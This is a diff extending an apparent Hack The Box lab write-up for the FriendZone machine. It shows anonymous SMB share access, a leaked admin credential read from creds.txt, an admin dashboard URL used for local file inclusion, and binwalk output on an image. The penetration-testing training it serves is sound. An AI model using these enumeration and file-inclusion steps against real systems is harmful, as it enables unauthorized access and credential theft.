@@ -190,3 +190,43 @@ ff02::2 ip6-allrouters
 10.10.10.123 hr.friendzone.red
 root@kali:~/HTB/Machines/123# 
 ```
+
+Visit
+https://administrator1.friendzone.red/
+```console
+root@kali:/mnt/hgfs/HTB/Machines/123# smbclient //10.10.10.123/general
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jan 16 15:10:51 2019
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
+
+		9221460 blocks of size 1024. 6251388 blocks available
+smb: \> more creds.txt
+getting file \creds.txt of size 57 as /tmp/smbmore.PzDdr5 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+
+/tmp/smbmore.t08AB7 (END)
+```
+Try Login
+
+Visit
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=1552735731
+
+Using LFI
+https://administrator1.friendzone.red/images/b.jpg
+
+```condole
+root@kali:/mnt/hgfs/HTB/Machines/123# binwalk b.jpg.png 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 852 x 480, 8-bit/color RGB, non-interlaced
+876           0x36C           Zlib compressed data, best compression
+
+root@kali:/mnt/hgfs/HTB/Machines/123#
+```
